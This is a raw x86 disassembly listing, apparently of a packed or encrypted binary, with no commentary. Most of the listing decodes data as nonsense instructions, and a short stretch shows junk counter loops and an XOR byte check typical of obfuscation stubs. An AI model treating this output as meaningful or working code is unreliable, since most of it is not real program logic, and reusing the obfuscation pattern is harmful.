  416fe4:	test   BYTE PTR [eax-0x1869fd21],dl
  416fea:	mov    bh,0x2d
  416fec:	scas   al,BYTE PTR es:[edi]
  416fed:	idiv   BYTE PTR [ecx-0x73]
  416ff0:	mov    ds:0x91c3b151,eax
  416ff5:	jns    0x417030
  416ff7:	inc    edx
  416ff8:	leave  
  416ff9:	xor    BYTE PTR [ebx+0x5a],dh
  416ffc:	cmp    eax,0xd37a088f
  417001:	cmp    BYTE PTR [esi+edi*8+0x1c],cl
  417005:	xchg   ecx,eax
  417006:	sti    
  417007:	dec    edx
  417008:	mov    al,ds:0x9b0a203e
  41700d:	aam    0x4c
  41700f:	popa   
  417010:	pop    eax
  417011:	outs   dx,DWORD PTR ds:[esi]
  417012:	push   esp
  417013:	fidiv  DWORD PTR [edi]
  417015:	fdivr  DWORD PTR [edx+eiz*1+0x123fd829]
  41701c:	cmp    eax,DWORD PTR [eax]
  41701e:	sbb    BYTE PTR [ebx+0x1],dl
  417021:	imul   ebp,DWORD PTR [ebx-0x11766232],0x9a4516d3
  41702b:	pusha  
  41702c:	cli    
  41702d:	add    BYTE PTR [ebx-0xf],dh
  417030:	pusha  
  417031:	jp     0x416fd9
  417033:	mov    ebp,0x6f9a7c1b
  417038:	jbe    0x417026
  41703a:	mov    bh,bl
  41703c:	out    0x1,eax
  41703e:	aas    
  41703f:	xor    bh,BYTE PTR [edi+0x71]
  417042:	cs in  al,dx
  417044:	ds pop esp
  417046:	ins    BYTE PTR es:[edi],dx
  417047:	les    edi,FWORD PTR [esi+0x4dbdc3a2]
  41704d:	cmp    al,0x3
  41704f:	dec    ebx
  417050:	mov    eax,0xa3c60320
  417055:	(bad)  
  417056:	jmp    0x417099
  417058:	add    cl,ch
  41705a:	mov    bl,0x2
  41705c:	add    BYTE PTR [eax],al
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi+0x44a765bb],edx
  41706d:	pop    esi
  41706e:	inc    ebp
  41706f:	sub    edi,DWORD PTR [edi+0x78]
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x41707e
  417077:	sub    bh,BYTE PTR [ecx]
  417079:	add    eax,0x36027fd5
  41707e:	cs es iret 
  417081:	pop    ebp
  417082:	or     al,0x2c
  417084:	call   0xd39b:0x44724486
  41708b:	cmp    BYTE PTR [ecx+0x65ef8ee1],al
  417091:	xor    edx,DWORD PTR [ecx+eax*2+0x15]
  417095:	std    
  417096:	sbb    BYTE PTR [ebp+eax*2+0x72],ch
  41709a:	cld    
  41709b:	mov    DWORD PTR [edx*2+0x5559f723],esi
  4170a2:	arpl   WORD PTR [ebp-0x75de1502],bx
  4170a8:	and    eax,0x19c6e775
  4170ad:	sbb    edi,edx
  4170af:	sbb    ebp,DWORD PTR [eax]
  4170b1:	inc    edx
  4170b2:	xor    DWORD PTR [ecx+0x70],esp
  4170b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170b6:	push   edi
  4170b7:	inc    ebx
  4170b8:	jl     0x4170c2
  4170ba:	xchg   ebp,eax
  4170bb:	pop    ecx
  4170bc:	call   0x3ef6:0x9624e86f
  4170c3:	xchg   edi,eax
  4170c4:	jno    0x41710d
  4170c6:	ins    BYTE PTR es:[edi],dx
  4170c7:	cli    
  4170c8:	ins    BYTE PTR es:[edi],dx
  4170c9:	sbb    edi,edx
  4170cb:	fdivr  DWORD PTR [edx+ecx*4-0x65aa4758]
  4170d2:	sbb    eax,0x5801c894
  4170d7:	aas    
  4170d8:	push   ecx
  4170d9:	mov    al,ds:0x617052da
  4170de:	xlat   BYTE PTR ds:[ebx]
  4170df:	xchg   ebx,eax
  4170e0:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4170e2:	aam    0x13
  4170e4:	pop    ss
  4170e5:	lods   eax,DWORD PTR ds:[esi]
  4170e6:	fwait
  4170e7:	pop    es
  4170e8:	pop    edi
  4170e9:	mov    al,ds:0xcd463fab
  4170ee:	xchg   esp,eax
  4170ef:	jns    0x417112
  4170f1:	clc    
  4170f2:	int3   
  4170f3:	mov    bl,BYTE PTR [ecx]
  4170f5:	mov    edi,0x16047cd2
  4170fa:	in     al,0x2a
  4170fc:	mov    BYTE PTR [eax+0x1c],bl
  4170ff:	shl    BYTE PTR [esi],0x8b
  417102:	pop    ss
  417103:	(bad)  
  417104:	xchg   edi,eax
  417105:	hlt    
  417106:	jecxz  0x417168
  417108:	int3   
  417109:	repnz cmp BYTE PTR [eax],al
  41710c:	inc    ecx
  41710d:	or     cl,dh
  41710f:	lock outs dx,DWORD PTR ds:[esi]
  417111:	mov    WORD PTR [edx],fs
  417113:	cmp    bp,WORD PTR [ecx+eax*4+0x495d4581]
  41711b:	pop    ds
  41711c:	push   ecx
  41711d:	adc    ch,BYTE PTR [esp+ebx*1]
  417120:	mov    DWORD PTR [eax-0x4a4911ff],eax
  417126:	push   cs
  417127:	add    DWORD PTR [ecx-0x120f67],esp
  41712d:	jne    0x417144
  41712f:	lock sar BYTE PTR [ecx+0x2a],1
  417133:	jno    0x41714e
  417135:	cwde   
  417136:	mov    dh,0x58
  417138:	add    esp,0xffffff8b
  41713b:	in     al,0xe4
  41713d:	dec    di
  41713f:	out    0x7b,al
  417141:	mov    ss,WORD PTR [ebp+0x57b684b5]
  417147:	cmp    eax,0xd452a4af
  41714c:	jg     0x417194
  41714e:	mov    eax,ds:0x25b6ecff
  417153:	inc    ebp
  417154:	fcomp  QWORD PTR [esi+0x6573b48a]
  41715a:	jmp    0xabfd7471
  41715f:	in     al,0x3e
  417161:	pop    es
  417162:	mov    DWORD PTR [eax+0x37],eax
  417165:	mov    esi,0x4182cc98
  41716a:	sbb    BYTE PTR [edi+0x656b5462],0x97
  417171:	mov    bl,0x95
  417173:	push   edx
  417174:	jg     0x4171e2
  417176:	(bad)  
  417177:	mov    esp,0xdf423c7f
  41717c:	in     al,0xe0
  41717e:	mov    ds:0x491e8586,eax
  417183:	sub    ebx,DWORD PTR ds:0x676e3947
  417189:	pop    edx
  41718a:	and    eax,0xd798ef06
  41718f:	adc    dh,BYTE PTR [edx]
  417191:	sti    
  417192:	hlt    
  417193:	(bad)  
  417194:	lods   al,BYTE PTR ds:[esi]
  417195:	jno    0x417198
  417197:	enter  0xaa3d,0xb3
  41719b:	add    BYTE PTR [edi],bl
  41719d:	aas    
  41719e:	mov    dl,0xd5
  4171a0:	in     al,0x33
  4171a2:	xchg   edi,eax
  4171a3:	das    
  4171a4:	or     eax,0xf736fcda
  4171a9:	iret   
  4171aa:	jo     0x417145
  4171ac:	stos   DWORD PTR es:[edi],eax
  4171ad:	dec    edx
  4171ae:	mov    DWORD PTR ds:0xaad317c3,esi
  4171b4:	jmp    0xe342:0x24796966
  4171bb:	popf   
  4171bc:	and    dh,ch
  4171be:	push   esi
  4171bf:	jo     0x41722e
  4171c1:	into   
  4171c2:	adc    DWORD PTR [edx],ebp
  4171c4:	mov    BYTE PTR [edx+ebp*2-0x6fce23de],dl
  4171cb:	arpl   bx,sp
  4171cd:	mov    ah,0x1b
  4171cf:	dec    edi
  4171d0:	dec    esp
  4171d1:	mov    ds:0xc6b28ab3,eax
  4171d6:	xchg   edi,eax
  4171d7:	mov    edi,0x351d663c
  4171dc:	jp     0x4171f7
  4171de:	or     esi,DWORD PTR [eax-0x2]
  4171e1:	fmulp  st(6),st
  4171e3:	ficom  WORD PTR [eax]
  4171e5:	ficomp DWORD PTR [edi-0x4de6469f]
  4171eb:	outs   dx,BYTE PTR ds:[esi]
  4171ec:	ins    BYTE PTR es:[edi],dx
  4171ed:	aad    0xca
  4171ef:	ret    
  4171f0:	fsubr  DWORD PTR [esi+0x24]
  4171f3:	scas   eax,DWORD PTR es:[edi]
  4171f4:	jmp    0x4171a3
  4171f6:	out    0x43,eax
  4171f8:	popf   
  4171f9:	sbb    dl,BYTE PTR [edi+0x7b42c8ad]
  4171ff:	xchg   ebp,eax
  417200:	repnz push ecx
  417202:	popa   
  417203:	or     al,0xe
  417205:	icebp  
  417206:	loopne 0x41723f
  417208:	add    eax,0x6ab83d43
  41720d:	mov    edi,0x27bddd8e
  417212:	xchg   DWORD PTR [esi],ecx
  417214:	int3   
  417215:	xchg   edi,eax
  417216:	pusha  
  417217:	cmp    ebx,DWORD PTR [ebp+0x4c736b9a]
  41721d:	call   0x4f097064
  417222:	inc    edx
  417223:	shl    BYTE PTR [eax+0x30],cl
  417226:	arpl   WORD PTR [eax-0x20],bp
  417229:	nop
  41722a:	mov    ch,0xd
  41722c:	adc    edx,DWORD PTR [ebx]
  41722e:	or     al,0x93
  417230:	xor    ecx,DWORD PTR [eax-0x457c8fa1]
  417236:	outs   dx,DWORD PTR es:[esi]
  417238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417239:	enter  0x95e2,0x8f
  41723d:	sub    DWORD PTR [edx+edx*1],ebp
  417240:	pop    edx
  417241:	or     eax,0xf639d149
  417246:	mov    eax,ds:0x735fc310
  41724b:	dec    eax
  41724c:	loop   0x417216
  41724e:	mov    ch,0x3
  417250:	jbe    0x417206
  417252:	es scas al,BYTE PTR es:[edi]
  417254:	push   ds
  417255:	and    DWORD PTR [ebx+edi*4+0x20],ebp
  417259:	jbe    0x417281
  41725b:	shl    BYTE PTR [eax],1
  41725d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41725e:	lods   eax,DWORD PTR ds:[esi]
  41725f:	lea    ebp,ds:0x4b44f400
  417265:	(bad)  
  417267:	mov    al,0xfc
  417269:	mov    bh,0xa8
  41726b:	add    eax,0x4a66b8cc
  417270:	or     DWORD PTR ds:0xe3177a8e,0xffffffd0
  417277:	push   ebp
  417278:	stc    
  417279:	inc    eax
  41727a:	pop    ds
  41727b:	mov    bl,0xb4
  41727d:	mov    ds:0xbc9a020e,eax
  417282:	in     eax,dx
  417283:	cmp    al,0x3d
  417285:	data16 mov dh,0x11
  417288:	pop    ebp
  417289:	jne    0x417243
  41728b:	test   cl,ch
  41728d:	cld    
  41728e:	adc    ecx,DWORD PTR [esp+esi*8-0x10ae1234]
  417295:	sbb    edx,ebp
  417297:	mov    WORD PTR [esi+0x4a],?
  41729a:	and    bh,BYTE PTR [eax+ebp*2+0x79bdd72b]
  4172a1:	inc    edx
  4172a2:	mov    DWORD PTR [eax],esp
  4172a4:	push   ecx
  4172a5:	mov    esi,0x3d0b0168
  4172aa:	popa   
  4172ab:	mov    bh,0x57
  4172ad:	dec    edx
  4172ae:	into   
  4172af:	std    
  4172b0:	test   eax,0x48417b87
  4172b5:	gs push ebx
  4172b7:	push   cs
  4172b8:	xchg   edi,eax
  4172b9:	dec    edx
  4172ba:	push   0x2b
  4172bc:	push   esp
  4172bd:	xchg   edx,eax
  4172be:	cmp    ah,BYTE PTR [edi]
  4172c0:	aad    0x54
  4172c2:	das    
  4172c3:	push   0x37030976
  4172c8:	mov    al,0x16
  4172ca:	or     DWORD PTR [esi-0x382bd72a],0x3a6f7076
  4172d4:	loopne 0x4172dd
  4172d6:	sbb    al,0x9c
  4172d8:	popf   
  4172d9:	loopne 0x4172d3
  4172db:	mov    bl,0x1c
  4172dd:	mov    ch,0x48
  4172df:	scas   al,BYTE PTR es:[edi]
  4172e0:	inc    ebx
  4172e1:	call   eax
  4172e3:	mov    cl,0xac
  4172e5:	xchg   ebp,eax
  4172e6:	sbb    eax,0xb4b61049
  4172eb:	xor    BYTE PTR [esp+edi*8],ah
  4172ee:	aas    
  4172ef:	(bad)  
  4172f0:	out    0xa6,al
  4172f2:	fisttp WORD PTR [ebx+0x7bb046b]
  4172f8:	inc    esp
  4172f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172fa:	retf   0x6190
  4172fd:	xchg   DWORD PTR [esp+edi*8+0x2da6e35],ecx
  417304:	and    BYTE PTR [edi],0xb6
  417307:	nop
  417308:	xor    BYTE PTR [edi+0x7f13f275],0x5d
  41730f:	retf   0xff01
  417312:	jne    0x41730c
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	rcr    BYTE PTR [edx+ebp*1],1
  417335:	es adc eax,0x787f28e2
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x4173bf
  417340:	loopne 0x4172fc
  417342:	(bad)  
  417344:	push   esp
  417345:	dec    ebx
  417346:	cmc    
  417347:	push   esp
  417348:	jg     0x41739e
  41734a:	dec    ebp
  41734b:	adc    al,0x98
  41734d:	cmp    ebp,esp
  41734f:	push   0x52
  417351:	sbb    DWORD PTR [eax+0x52],ebx
  417354:	loop   0x4173b8
  417356:	mov    WORD PTR [eax],fs
  417358:	inc    ecx
  417359:	repz push edx
  41735b:	cld    
  41735c:	(bad)  
  41735e:	enter  0xcee,0x8
  417362:	and    BYTE PTR [edx-0xecec40e],0xcf
  417369:	pop    edx
  41736a:	mov    bl,0x31
  41736c:	mov    edi,0xbb85ab53
  417371:	and    eax,0x58402e30
  417376:	mov    cl,0xa
  417378:	cmp    eax,0xe19ad6f5
  41737d:	sahf   
  41737e:	or     al,0x2c
  417380:	sub    BYTE PTR [edx+0x411050cc],al
  417386:	push   edi
  417387:	xchg   ecx,eax
  417388:	jecxz  0x41734c
  41738a:	xor    al,0xd
  41738c:	sbb    esp,edx
  41738e:	(bad)  
  417390:	(bad)  
  417392:	cmp    bh,bh
  417394:	std    
  417395:	pusha  
  417396:	pop    ds
  417397:	sub    ebx,eax
  417399:	or     edi,edx
  41739b:	add    DWORD PTR [ebx],0x42
  41739e:	inc    ebp
  41739f:	jl     0x41734e
  4173a1:	or     al,0x40
  4173a3:	push   cs
  4173a4:	jae    0x4173e2
  4173a6:	jns    0x417405
  4173a8:	cdq    
  4173a9:	inc    edi
  4173aa:	mov    eax,0xd3314d6
  4173af:	(bad)  [edx]
  4173b1:	mov    eax,0xac5d0958
  4173b6:	mov    ds:0x885bd108,eax
  4173bb:	mov    cl,0x2e
  4173bd:	xor    DWORD PTR [edx],ebx
  4173bf:	jae    0x4173e5
  4173c1:	add    BYTE PTR [ebp+0x6a7c4a2],0xc
  4173c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173c9:	retf   0xca2e
  4173cc:	std    
  4173cd:	js     0x417416
  4173cf:	out    dx,eax
  4173d0:	mov    eax,ds:0x9b596f19
  4173d5:	xor    BYTE PTR [ebp+0x7c],bl
  4173d8:	addr16 stc 
  4173da:	ja     0x417411
  4173dc:	je     0x4173b0
  4173de:	jbe    0x417420
  4173e0:	loope  0x417362
  4173e2:	jne    0x41737d
  4173e4:	out    0xea,al
  4173e6:	dec    eax
  4173e7:	mov    bl,0x72
  4173e9:	jo     0x4173b5
  4173eb:	test   BYTE PTR [edi],al
  4173ed:	sub    ecx,DWORD PTR [ecx]
  4173ef:	jecxz  0x417449
  4173f1:	daa    
  4173f2:	not    DWORD PTR [ebx]
  4173f4:	xchg   esi,eax
  4173f5:	pop    esp
  4173f6:	shl    DWORD PTR [esi+0x5585b1d5],cl
  4173fc:	push   0x76d1e296
  417401:	(bad)  
  417403:	adc    DWORD PTR [edx-0x12],ebp
  417406:	outs   dx,DWORD PTR ds:[esi]
  417407:	adc    BYTE PTR [ecx+ebp*2+0xcc5f6a9],bl
  41740e:	mov    esi,0x2783815
  417413:	or     BYTE PTR [ecx+0x6d6b0fd5],al
  417419:	xchg   esp,eax
  41741a:	sub    al,0xe9
  41741c:	stc    
  41741d:	sub    BYTE PTR [ebp+0x66494233],dh
  417423:	pop    esp
  417424:	add    BYTE PTR [edi+0x6efcea77],ah
  41742a:	push   es
  41742b:	and    dh,BYTE PTR [ebx-0x6a]
  41742e:	pop    eax
  41742f:	iret   
  417430:	push   0xfffffffc
  417432:	adc    DWORD PTR [ebp+0x25d6f9a8],edx
  417438:	mov    ebx,0xfd3764fb
  41743d:	mov    al,0xaf
  41743f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417440:	loopne 0x417454
  417442:	daa    
  417443:	fwait
  417444:	out    0xa4,al
  417446:	inc    DWORD PTR [bx+si-0x458f]
  41744b:	pop    ds
  41744c:	outs   dx,BYTE PTR ds:[esi]
  41744d:	jmp    0x5bb9:0x60185a51
  417454:	lods   eax,DWORD PTR ds:[esi]
  417455:	(bad)  
  417456:	stc    
  417457:	inc    edi
  417458:	pushf  
  417459:	in     eax,0x5b
  41745b:	jg     0x417463
  41745d:	add    BYTE PTR [eax+0x36],0xfd
  417461:	mov    eax,0xcfd0d70b
  417466:	sub    dh,cl
  417468:	inc    esi
  417469:	(bad)  
  41746a:	xor    BYTE PTR [eax-0x525f07d3],dl
  417470:	inc    ebx
  417471:	ror    DWORD PTR [edx],1
  417473:	mov    ch,0xf8
  417475:	push   ss
  417476:	push   0xa8186503
  41747b:	push   0xffffffd1
  41747d:	inc    esp
  41747e:	and    ebp,esi
  417480:	mov    DWORD PTR [ecx+0x17],ecx
  417483:	adc    edx,edi
  417485:	fstp   QWORD PTR [ebp+0x2345322]
  41748b:	push   ebx
  41748c:	xlat   BYTE PTR ds:[ebx]
  41748d:	ss js  0x417422
  417490:	aad    0xc5
  417492:	add    DWORD PTR [esp+ebx*8+0x7b],ecx
  417496:	mov    bl,0xc0
  417498:	mov    BYTE PTR [edi],bl
  41749a:	(bad)  
  41749b:	into   
  41749c:	push   0x4cfc9bb5
  4174a1:	pop    ss
  4174a2:	pop    edi
  4174a3:	gs push ds
  4174a5:	shl    cl,cl
  4174a7:	data16 jle 0x41749a
  4174aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ab:	inc    eax
  4174ac:	and    ebx,ebp
  4174ae:	mov    esi,0xb3b16910
  4174b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174b4:	lahf   
  4174b5:	out    0x57,al
  4174b7:	and    BYTE PTR [ecx+0x61],cl
  4174ba:	sbb    edi,eax
  4174bc:	sub    DWORD PTR [ebp-0x73d9376a],esp
  4174c2:	jne    0x4174d3
  4174c4:	xchg   ecx,eax
  4174c5:	call   0x7cb672d9
  4174ca:	xchg   ebx,eax
  4174cb:	jne    0x4174ad
  4174cd:	fdiv   DWORD PTR [ebx+edi*8]
  4174d0:	lds    ebx,FWORD PTR [bx]
  4174d3:	sti    
  4174d4:	mov    al,BYTE PTR [edi+0x50]
  4174d7:	popa   
  4174d8:	stos   DWORD PTR es:[edi],eax
  4174d9:	addr16 ret 0x94d4
  4174dd:	add    bh,bl
  4174df:	sub    DWORD PTR [edx+0x710967db],edi
  4174e5:	inc    eax
  4174e6:	mov    edx,0xa26969ac
  4174eb:	pop    edx
  4174ec:	cs dec edx
  4174ee:	es jmp 0x4174ea
  4174f1:	iret   
  4174f2:	jl     0x417561
  4174f4:	adc    al,0x66
  4174f6:	iret   
  4174f7:	dec    eax
  4174f8:	mov    dl,BYTE PTR [edi+0x1c]
  4174fb:	xor    al,0x4f
  4174fd:	lods   al,BYTE PTR ds:[esi]
  4174fe:	in     al,dx
  4174ff:	dec    ebp
  417500:	scas   al,BYTE PTR es:[edi]
  417501:	xor    BYTE PTR [edi+0x1147236a],ah
  417507:	(bad)  
  417508:	(bad)  
  417509:	mov    al,ds:0x4a186d1a
  41750e:	ret    
  41750f:	addr16 jle 0x4174f4
  417512:	xchg   ebx,eax
  417513:	(bad)  
  417514:	xchg   ecx,eax
  417515:	pop    ds
  417516:	arpl   WORD PTR [esi],ax
  417518:	(bad)
  41751b:	dec    esi
  41751c:	add    BYTE PTR [ecx-0x6ef2f25b],al
  417522:	sbb    ax,0x41c
  417526:	xchg   ebp,eax
  417527:	imul   esp,DWORD PTR [esi+0x4],0x189a7010
  41752e:	jne    0x417577
  417530:	xchg   ecx,eax
  417531:	stos   DWORD PTR es:[edi],eax
  417532:	inc    ecx
  417533:	mov    esp,ds
  417535:	(bad)  
  417536:	push   edi
  417537:	jno    0x41756d
  417539:	jmp    0x467f2398
  41753e:	daa    
  41753f:	push   ebp
  417540:	into   
  417541:	cmc    
  417542:	pop    ecx
  417543:	jbe    0x4175b0
  417545:	test   BYTE PTR [ecx],al
  417547:	aam    0x92
  417549:	outs   dx,DWORD PTR ds:[esi]
  41754a:	out    0xa8,al
  41754c:	pop    esp
  41754d:	mov    ah,BYTE PTR [eax-0x16]
  417550:	fdivr  st(4),st
  417552:	ds push edi
  417554:	jae    0x41755f
  417556:	dec    edi
  417557:	mov    ah,0xfa
  417559:	fdivr  QWORD PTR [edi+0x48]
  41755c:	lds    edx,FWORD PTR cs:[edi+0x30]
  417560:	cmp    DWORD PTR [ecx-0x5e10782c],edx
  417566:	sbb    DWORD PTR [edi],esi
  417568:	pushf  
  417569:	test   eax,0x3222e214
  41756e:	fcom   QWORD PTR [eax]
  417570:	xchg   ecx,eax
  417571:	mov    al,0xe0
  417573:	mov    bl,0xc6
  417575:	push   esp
  417576:	mov    esp,0xef400c48
  41757b:	ret    0x98d0
  41757e:	add    BYTE PTR [edi],ch
  417580:	data16 repz aaa 
  417583:	mov    esi,ebp
  417585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417586:	shr    DWORD PTR [edi-0x653f490b],1
  41758c:	dec    esi
  41758d:	jnp    0x417529
  41758f:	punpckhbw mm5,QWORD PTR [eax-0x46532bfd]
  417596:	mov    WORD PTR [ebx+eiz*1],gs
  417599:	cmp    eax,DWORD PTR [edx]
  41759b:	leave  
  41759c:	xchg   edx,eax
  41759d:	pop    ebx
  41759e:	and    DWORD PTR [eax],esp
  4175a0:	and    edi,esi
  4175a2:	mov    bh,BYTE PTR [ebx+ebp*4-0x6]
  4175a6:	push   ebp
  4175a7:	mov    ds:0x6fc7054e,al
  4175ac:	mov    dl,0x85
  4175ae:	mov    esi,0x87e6eeba
  4175b3:	cld    
  4175b4:	sbb    al,0x7f
  4175b6:	retf   0xc733
  4175b9:	jp     0x417636
  4175bb:	popf   
  4175bc:	jp     0x417633
  4175be:	push   edi
  4175bf:	fcomp  DWORD PTR [ebp+0x6f]
  4175c2:	add    eax,0x63a569fa
  4175c7:	out    0x4f,eax
  4175c9:	ins    DWORD PTR es:[edi],dx
  4175ca:	dec    ecx
  4175cb:	pushf  
  4175cc:	inc    cx
  4175ce:	sbb    DWORD PTR [esi-0x5838e934],esp
  4175d4:	sahf   
  4175d5:	pop    ss
  4175d6:	push   edx
  4175d7:	imul   DWORD PTR [ebp+0x23]
  4175da:	add    eax,esi
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	enter  0x1582,0x91
  4176be:	jg     0x4176ed
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0x4f78787e
  4176c7:	mov    ah,0xb5
  4176c9:	adc    bl,BYTE PTR [ebp+0x29f2dfd9]
  4176cf:	add    eax,0x2e9b2f86
  4176d4:	cmp    eax,0x22a1b378
  4176d9:	(bad)  
  4176da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176db:	mov    al,0xf5
  4176dd:	mov    esp,0xe68fa462
  4176e2:	xor    DWORD PTR [ebx-0x20],esi
  4176e5:	pop    ss
  4176e6:	out    0xab,al
  4176e8:	mov    ds:0x40ba89b3,al
  4176ed:	mov    ss,WORD PTR ds:0xcfa61c8a
  4176f3:	popf   
  4176f4:	push   edx
  4176f5:	dec    ebp
  4176f6:	arpl   WORD PTR [esi-0x4d],si
  4176f9:	shl    DWORD PTR [ebx+0x47],0x7f
  4176fd:	push   ebx
  4176fe:	int3   
  4176ff:	iret   
  417700:	xor    al,0x91
  417702:	js     0x417689
  417704:	jae    0x417766
  417706:	xchg   edi,eax
  417707:	lods   al,BYTE PTR ds:[esi]
  417708:	dec    ecx
  417709:	js     0x4176a8
  41770b:	(bad)  
  41770c:	out    dx,eax
  41770d:	stos   DWORD PTR es:[edi],eax
  41770e:	jmp    0x417751
  417710:	inc    ebp
  417711:	test   al,0x7f
  417713:	push   eax
  417714:	pop    esi
  417715:	jmp    0xd17e:0xc59e019a
  41771c:	push   es
  41771d:	sbb    ch,ch
  41771f:	jmp    0x1b775b76
  417724:	ret    
  417725:	jp     0x41778c
  417727:	sub    al,0xee
  417729:	sbb    al,0xec
  41772b:	or     BYTE PTR [edi],ch
  41772d:	push   0xffffffd5
  41772f:	add    ebx,DWORD PTR [ecx+0x45]
  417732:	add    al,0xda
  417734:	loope  0x417772
  417736:	f2xm1  
  417738:	sub    eax,0xebf2039e
  41773d:	jl     0x417708
  41773f:	ror    DWORD PTR [edx-0x2c],cl
  417742:	lods   al,BYTE PTR ds:[esi]
  417743:	sub    BYTE PTR [eax+0x76e8c4a5],cl
  417749:	mov    ecx,0x9572b4d9
  41774e:	and    edi,ebp
  417750:	popa   
  417751:	rol    al,cl
  417753:	int3   
  417754:	inc    esi
  417755:	(bad)  
  417757:	fst    QWORD PTR [esi+edx*1]
  41775a:	xchg   ebx,eax
  41775b:	fdivrp st(6),st
  41775d:	shr    BYTE PTR [edx+0x4645cdaa],cl
  417763:	xor    DWORD PTR [esi+ebx*2],edx
  417766:	mov    al,0x4f
  417768:	dec    ebp
  417769:	sub    eax,0x2b97cdd0
  41776e:	dec    esp
  41776f:	adc    DWORD PTR [esi],edx
  417771:	cmp    al,BYTE PTR [edx+0x19d2f74]
  417777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417778:	xor    ecx,esi
  41777a:	add    al,0x8c
  41777c:	(bad)  
  41777d:	loop   0x4177c6
  41777f:	mov    edx,0x1249c7b5
  417784:	adc    eax,0x259b9705
  417789:	icebp  
  41778a:	out    dx,al
  41778b:	jnp    0x41770e
  41778d:	fwait
  41778e:	adc    ch,BYTE PTR [eax]
  417790:	out    0xd7,eax
  417792:	arpl   WORD PTR [edi+ecx*4],cx
  417795:	jne    0x417793
  417797:	push   es
  417798:	bound  ebx,QWORD PTR [ebp-0x8]
  41779b:	or     edx,edx
  41779d:	(bad)  
  41779e:	and    eax,0x9a4c9f7
  4177a3:	sti    
  4177a4:	pop    edi
  4177a5:	xor    cl,BYTE PTR [eax+0x25]
  4177a8:	xchg   ecx,eax
  4177a9:	push   ebx
  4177aa:	sbb    BYTE PTR [edx-0x29],0xb5
  4177ae:	aad    0x70
  4177b0:	cmp    BYTE PTR [edi],0xaa
  4177b3:	test   eax,0xf5bb9f01
  4177b8:	pop    ds
  4177b9:	mov    edi,0xd8c5da85
  4177be:	test   DWORD PTR [edi],ebx
  4177c0:	dec    eax
  4177c1:	mov    ecx,0xcd72372f
  4177c6:	adc    eax,0xca5c992c
  4177cb:	cli    
  4177cc:	arpl   sp,bx
  4177ce:	xchg   ebx,eax
  4177cf:	imul   eax,DWORD PTR [esi+0x46],0xffffffa6
  4177d3:	xchg   DWORD PTR [esi-0x39],edi
  4177d6:	xchg   ebx,eax
  4177d7:	out    dx,al
  4177d8:	xchg   DWORD PTR [edi+0x37067370],ebp
  4177de:	out    dx,eax
  4177df:	mov    al,ds:0xe1781e9f
  4177e4:	or     BYTE PTR [ebx+eiz*2],al
  4177e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177e8:	cmp    dl,BYTE PTR [edx]
  4177ea:	inc    ebp
  4177eb:	mov    WORD PTR [ecx+ebx*4-0x411a64e5],gs
  4177f2:	out    0xd8,al
  4177f4:	adc    BYTE PTR [ebx],0x7d
  4177f7:	push   ebp
